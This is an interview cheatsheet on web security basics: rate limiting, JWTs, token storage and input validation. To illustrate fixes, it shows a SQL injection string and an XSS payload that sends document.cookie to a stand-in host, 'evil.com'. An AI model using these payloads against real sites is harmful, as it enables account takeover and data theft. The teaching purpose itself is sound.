# Security — Interview Cheatsheet

## What To Say When Security Comes Up

> [!tip] Don't wait for the interviewer to ask. Mention security proactively in your NFRs section.

```
"Since this system handles sensitive user data, I'd cover four things:
 1. JWT-based auth with short-lived access tokens and refresh tokens
 2. HTTPS everywhere — enforce at the API gateway
 3. Encryption at rest for sensitive fields — AES-256, keys in KMS
 4. Rate limiting at the API gateway to prevent abuse and brute force"
```

That's enough. Don't deep dive unless pushed.

---

## Rate Limiting

> [!info] Limit how many requests a client can make in a given time window. Enforced at the API gateway — abusive requests never reach your servers.

```
Rule: max 5 login attempts per minute per IP

Requests 1-5  → allowed
Request 6     → 429 Too Many Requests

Protects against:
  Brute force  → trying millions of passwords
  Abuse        → scraping your entire API
  DDoS         → flooding your service with traffic
```

> [!tip] "I'd enforce rate limiting at the API gateway — per IP for public endpoints, per user for authenticated endpoints. Login endpoint gets the strictest limits."

**Algorithms** — covered in depth in the Rate Limiter case study. For now:
```
Fixed window   → simple counter per time window, has edge case at window boundary
Sliding window → smoother, no boundary spike
Token bucket   → allows short bursts, most common in practice
```

---

## Input Validation

> [!info] Never trust data coming from outside your system. Validate at every system boundary — user input, third-party APIs, file uploads.

**SQL Injection:**
```
Attacker input: ' OR '1'='1

Naive query:  SELECT * FROM users WHERE username = '' OR '1'='1'
              → returns entire users table

Fix: parameterized queries — never concatenate user input into SQL
     db.query("SELECT * FROM users WHERE username = ?", [username])
```

**XSS (Cross-Site Scripting):**
```
Attacker posts as comment: <script>fetch('evil.com?c=' + document.cookie)</script>

If rendered as raw HTML → every user who views it sends their cookies to attacker

Fix: escape HTML output — render as text, never as HTML
     "<script>" becomes "&lt;script&gt;" — displays as text, doesn't execute
```

> [!important] Rule: validate and sanitize at system boundaries. Trust nothing external. Trust everything internal.

---

## Quick Reference

| Concern | Solution | Where enforced |
|---|---|---|
| Identity | JWT access token | Every API request |
| Session longevity | Refresh token (DB-backed) | /auth/refresh endpoint |
| Token theft damage control | Short access token expiry (15min) | Token generation |
| Cookie theft via XSS | HttpOnly flag on refresh token cookie | Server cookie config |
| Cross-origin abuse | CORS policy | API gateway / server |
| Data interception | TLS/HTTPS | API gateway |
| DB breach | Encryption at rest (AES-256) | DB / storage layer |
| Abuse / brute force | Rate limiting | API gateway |
| Injection attacks | Parameterized queries, HTML escaping | Application layer |

---

## Common Interview Traps

> [!warning]

**"Can you revoke a JWT?"**
```
Wrong: "Yes, just invalidate it on the server"
Right: "No — JWT is stateless, verified by signature, no DB check.
        To revoke, you'd need a token blacklist in DB — but that defeats
        the purpose of stateless JWT. The correct solution is short expiry
        + refresh tokens stored in DB (which CAN be revoked)."
```

**"Where do you store tokens on the client?"**
```
Mobile  → secure storage (iOS Keychain, Android Keystore)
Web     → access token in memory, refresh token in HttpOnly cookie
          never store sensitive tokens in localStorage — XSS can read it
```

**"What's the difference between authentication and authorization?"**
```
Authentication → who are you? (login, JWT verification)
Authorization  → what can you do? (RBAC, permission checks)
Both required on every request — auth first, then permissions
```
